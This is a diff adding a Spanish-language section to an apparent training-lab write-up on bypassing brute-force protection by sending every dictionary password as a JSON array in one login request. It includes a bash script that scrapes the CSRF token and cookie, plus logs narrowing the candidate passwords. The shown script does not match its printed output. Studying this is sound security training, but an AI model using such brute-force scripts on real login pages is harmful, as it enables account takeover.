@@ -425,5 +425,65 @@ Y luego de esperar un minuto por el bloqueo, probamos las credenciales y complet
 
 ## 6. Lab: Broken brute-force protection, multiple credentials per request
 
+Cuando consultamos al login podemos ver, que este ya es un poco diferente por la manera en como envia los parametros post (formano JSON)
+
+![test](img19.png)
+
+Entonces, lo que hacemos en intentar enviar todas las claves del diccionario mediante un array en password con el siguiente codigo:
+
+```bash
+#!/bin/bash
+
+URL='https://ac7d1fc61e0921f0804371d000d70007.web-security-academy.net/login'
+NULL='/dev/null'
+
+REQUEST1=`curl $URL -D- -s`
+CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
+COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
+USER="carlos"
+
+PASSS=`cat password.txt | tr '\n' ':' | sed s/':'/'","'/g`
+DATA='{"csrf":"'$CSRF'","username":"'$USER'","password":["'$PASSS'"]}'
+
+curl $URL -d $DATA -b $COOKIE
+```
+
+Lo curioso es que no recibimos ningun output, lo cual parece ser muy misterioso. Intentaremos dividir en 2 partes el string para de esa manera verificar si esto ocurre cuando enviamos muchos argumentos o algo esta ocurriendo por detrás que nos puede dar una pista de que hacer.
+
+```bash
+$ bash enum-user6.sh 
+
+La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow
+La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess
+La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper
+Estoy dentro de tu 4 #En esta parte ya nos bloqueo la pagina por un minuto pero ya tenemos una lista reducida.
+Estoy dentro de tu 5
+Estoy dentro de tu 6
+Estoy dentro de tu 7
+```
+
+Y actualizamos pass0.txt con el comando siguiente:
+
+``` 
+echo 'thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper' | sed s/'","'/'\n'/g > pass0.txt
+```
+
+Y corremos el script por segunda vez comantando la linea que hace cp de password.txt a pass0.txt.
+
+```bash
+$ bash enum-user6.sh 
+La clave debe estar en: thomas","hockey","ranger","daniel","starwars","klaster
+La clave debe estar en: daniel","starwars","klaster
+La clave debe estar en: starwars","klaster
+```
+
+En este caso solo nos queda probar una de las dos claves y logearnos de manera exitosa.
+
+![done](img20.png)
+
+## 7. 
+
+
+
 
 
